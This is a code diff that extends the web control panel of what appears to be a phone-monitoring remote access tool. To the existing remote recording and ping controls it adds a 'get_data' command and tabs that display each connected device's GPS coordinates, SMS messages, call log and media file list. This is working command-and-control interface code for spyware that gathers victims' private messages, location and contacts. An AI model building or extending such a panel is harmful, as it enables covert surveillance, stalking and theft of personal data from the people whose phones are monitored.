@@ -136,6 +136,61 @@
         color: #fff;
       }
 
+      /* ── Data tabs ──────────────────────────────────────────────── */
+      .tab-bar {
+        display: flex;
+        gap: 4px;
+        margin-top: 14px;
+        flex-wrap: wrap;
+      }
+      .tab-btn {
+        background: #263238;
+        border: 1px solid #37474f;
+        border-radius: 6px;
+        color: #90a4ae;
+        cursor: pointer;
+        font-size: 12px;
+        padding: 5px 12px;
+        transition: background 0.15s;
+      }
+      .tab-btn.active {
+        background: #1976d2;
+        border-color: #1976d2;
+        color: #fff;
+      }
+      .tab-panel {
+        display: none;
+        margin-top: 10px;
+        max-height: 240px;
+        overflow-y: auto;
+        font-size: 12px;
+      }
+      .tab-panel.active { display: block; }
+      .data-row {
+        display: flex;
+        flex-direction: column;
+        padding: 6px 8px;
+        border-bottom: 1px solid #1e2330;
+        line-height: 1.5;
+      }
+      .data-row:last-child { border-bottom: none; }
+      .data-label { color: #546e7a; font-size: 11px; }
+      .data-val   { color: #cfd8dc; word-break: break-all; }
+      .data-badge {
+        display: inline-block;
+        border-radius: 4px;
+        padding: 1px 6px;
+        font-size: 10px;
+        font-weight: bold;
+        margin-left: 6px;
+      }
+      .badge-in     { background: #1b5e20; color: #a5d6a7; }
+      .badge-out    { background: #0d47a1; color: #90caf9; }
+      .badge-missed { background: #b71c1c; color: #ef9a9a; }
+      .badge-inbox  { background: #263238; color: #80cbc4; }
+      .badge-sent   { background: #1a237e; color: #9fa8da; }
+      .badge-unread { background: #e65100; color: #ffe0b2; font-size: 9px; margin-left: 4px; }
+
       /* ── Recording list ─────────────────────────────────────────── */
       .rec-list {
         margin-top: 8px;
@@ -260,7 +315,9 @@
       // Config — auto-detects ws/wss and host so it works locally AND on Render
       // ════════════════════════════════════════════════════════════════════
       const _wsProto = location.protocol === "https:" ? "wss" : "ws";
-      const _wsHost  = location.port ? `${location.hostname}:${location.port}` : location.hostname;
+      const _wsHost = location.port
+        ? `${location.hostname}:${location.port}`
+        : location.hostname;
       const WS_CONTROL_URL = `${_wsProto}://${_wsHost}/control`;
 
       // ════════════════════════════════════════════════════════════════════
@@ -338,6 +395,9 @@
           case "ack":
             log(`ACK ${msg.deviceId}: ${msg.message}`, "info");
             break;
+          case "device_data":
+            renderDeviceData(msg.deviceId, msg.data);
+            break;
           case "error":
             log(`Error: ${msg.message}`, "err");
             break;
@@ -384,8 +444,19 @@
       <button class="btn-rec"   id="btnRec_${deviceId}"   onclick="startRecord('${deviceId}')">⏺ Start Record</button>
       <button class="btn-stop"  id="btnStop_${deviceId}"  onclick="stopRecord('${deviceId}')" disabled>⏹ Stop Record</button>
       <button class="btn-ping"  onclick="pingDevice('${deviceId}')">🏓 Ping</button>
+      <button class="btn-ping"  onclick="refreshData('${deviceId}')">🔄 Refresh Data</button>
     </div>
     <div class="rec-list" id="recList_${deviceId}"></div>
+    <div class="tab-bar">
+      <button class="tab-btn active" onclick="openTab('${deviceId}','location',this)">📍 Location</button>
+      <button class="tab-btn"        onclick="openTab('${deviceId}','sms',this)">💬 SMS</button>
+      <button class="tab-btn"        onclick="openTab('${deviceId}','calls',this)">📞 Calls</button>
+      <button class="tab-btn"        onclick="openTab('${deviceId}','media',this)">🖼 Media</button>
+    </div>
+    <div class="tab-panel active" id="tab_${deviceId}_location"><span style="color:#455a64">Waiting for data…</span></div>
+    <div class="tab-panel"        id="tab_${deviceId}_sms"><span style="color:#455a64">Waiting for data…</span></div>
+    <div class="tab-panel"        id="tab_${deviceId}_calls"><span style="color:#455a64">Waiting for data…</span></div>
+    <div class="tab-panel"        id="tab_${deviceId}_media"><span style="color:#455a64">Waiting for data…</span></div>
   `;
         document.getElementById("devicesContainer").appendChild(card);
 
@@ -491,6 +562,126 @@
       function pingDevice(deviceId) {
         sendCmd(deviceId, "ping");
         log(`Pinged ${deviceId}`, "info");
+      }
+
+      function refreshData(deviceId) {
+        sendCmd(deviceId, "get_data");
+        log(`Data refresh requested for ${deviceId}`, "info");
+      }
+
+      function openTab(deviceId, tab, btn) {
+        // Hide all panels for this device
+        ["location","sms","calls","media"].forEach(t => {
+          const p = document.getElementById(`tab_${deviceId}_${t}`);
+          if (p) p.classList.remove("active");
+        });
+        // Deactivate all tab buttons on this card
+        const card = document.getElementById(`card_${deviceId}`);
+        card.querySelectorAll(".tab-btn").forEach(b => b.classList.remove("active"));
+        // Activate selected
+        const panel = document.getElementById(`tab_${deviceId}_${tab}`);
+        if (panel) panel.classList.add("active");
+        if (btn) btn.classList.add("active");
+      }
+
+      function renderDeviceData(deviceId, data) {
+        if (!data) return;
+
+        // ── Location ──────────────────────────────────────────────
+        const locEl = document.getElementById(`tab_${deviceId}_location`);
+        if (locEl && data.location) {
+          const l = data.location;
+          if (l.error) {
+            locEl.innerHTML = `<div class="data-row"><span class="data-val" style="color:#ef5350">⚠ ${l.error}</span></div>`;
+          } else {
+            const mapsUrl = `https://maps.google.com/?q=${l.lat},${l.lon}`;
+            locEl.innerHTML = `
+              <div class="data-row">
+                <span class="data-label">Coordinates</span>
+                <span class="data-val"><a href="${mapsUrl}" target="_blank" style="color:#4fc3f7">${l.lat.toFixed(6)}, ${l.lon.toFixed(6)}</a></span>
+              </div>
+              <div class="data-row">
+                <span class="data-label">Accuracy</span>
+                <span class="data-val">${l.accuracy ? l.accuracy.toFixed(1) + ' m' : 'N/A'}</span>
+              </div>
+              <div class="data-row">
+                <span class="data-label">Provider</span>
+                <span class="data-val">${l.provider || 'N/A'}</span>
+              </div>
+              <div class="data-row">
+                <span class="data-label">Time</span>
+                <span class="data-val">${l.time ? new Date(l.time).toLocaleString() : 'N/A'}</span>
+              </div>`;
+          }
+        }
+
+        // ── SMS ───────────────────────────────────────────────────
+        const smsEl = document.getElementById(`tab_${deviceId}_sms`);
+        if (smsEl && data.sms) {
+          if (data.sms.length === 0) {
+            smsEl.innerHTML = `<div class="data-row"><span class="data-label">No SMS found or permission denied</span></div>`;
+          } else {
+            smsEl.innerHTML = data.sms.map(s => `
+              <div class="data-row">
+                <div>
+                  <span class="data-val" style="font-weight:bold">${s.address || 'Unknown'}</span>
+                  <span class="data-badge badge-${s.type}">${s.type}</span>
+                  ${!s.read ? '<span class="data-badge badge-unread">UNREAD</span>' : ''}
+                  <span class="data-label" style="float:right">${new Date(s.date).toLocaleString()}</span>
+                </div>
+                <span class="data-val">${escHtml(s.body || '')}</span>
+              </div>`).join('');
+          }
+        }
+
+        // ── Call Log ──────────────────────────────────────────────
+        const callsEl = document.getElementById(`tab_${deviceId}_calls`);
+        if (callsEl && data.callLog) {
+          if (data.callLog.length === 0) {
+            callsEl.innerHTML = `<div class="data-row"><span class="data-label">No calls found or permission denied</span></div>`;
+          } else {
+            callsEl.innerHTML = data.callLog.map(c => `
+              <div class="data-row">
+                <div>
+                  <span class="data-val" style="font-weight:bold">${c.name || c.number || 'Unknown'}</span>
+                  ${c.name ? `<span class="data-label"> ${c.number}</span>` : ''}
+                  <span class="data-badge badge-${c.type === 'incoming' ? 'in' : c.type === 'outgoing' ? 'out' : 'missed'}">${c.type}</span>
+                  <span class="data-label" style="float:right">${new Date(c.date).toLocaleString()}</span>
+                </div>
+                <span class="data-label">Duration: ${formatDuration(c.duration)}</span>
+              </div>`).join('');
+          }
+        }
+
+        // ── Media ─────────────────────────────────────────────────
+        const mediaEl = document.getElementById(`tab_${deviceId}_media`);
+        if (mediaEl && data.media) {
+          if (data.media.length === 0) {
+            mediaEl.innerHTML = `<div class="data-row"><span class="data-label">No media found or permission denied</span></div>`;
+          } else {
+            mediaEl.innerHTML = data.media.map(m => `
+              <div class="data-row">
+                <div>
+                  <span class="data-val">${escHtml(m.name || '')}</span>
+                  <span class="data-badge" style="background:#1a237e;color:#9fa8da">${m.type}</span>
+                </div>
+                <span class="data-label">${formatSize(m.size)} · ${m.mime} · ${new Date(m.date).toLocaleDateString()}</span>
+                <span class="data-label" style="color:#37474f;font-size:10px">${escHtml(m.path || '')}</span>
+              </div>`).join('');
+          }
+        }
+
+        log(`📊 Data received from ${deviceId.substring(0,8)}`, "info");
+      }
+
+      function escHtml(str) {
+        return String(str).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');
+      }
+
+      function formatDuration(secs) {
+        if (!secs) return '0s';
+        const m = Math.floor(secs / 60), s = secs % 60;
+        return m > 0 ? `${m}m ${s}s` : `${s}s`;
       }
 
       // ════════════════════════════════════════════════════════════════════
